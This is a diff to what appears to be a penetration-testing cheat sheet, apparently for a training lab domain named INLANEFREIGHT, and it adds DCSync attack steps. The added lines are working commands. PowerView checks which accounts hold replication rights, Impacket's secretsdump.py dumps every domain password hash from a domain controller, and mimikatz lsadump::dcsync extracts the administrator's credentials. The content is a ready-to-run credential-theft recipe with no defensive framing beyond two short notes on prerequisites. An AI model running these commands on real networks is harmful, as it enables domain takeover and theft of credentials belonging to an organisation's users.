@@ -280,8 +280,28 @@ Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.M
 [!NOTE]  
 >Must have control over account that has right to perform domain replication
 
-**User Enumeration**
+**Method 1**
 ```
 Get-DomainUser -Identity user-of-interest  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
 ```
+```
+$sid = "sid" 
+```
+```
+Get-ObjectACL "DC=Domain-Controller,DC=local" ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+```
+```
+ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/user-of-interest@172.16.5.5 
+```
+**Method 2**
 
+[!NOTE]  
+>Must be ran in context of user with DCSync privileges
+
+```
+.\mimikatz.exe
+
+privilege::debug 
+
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+```
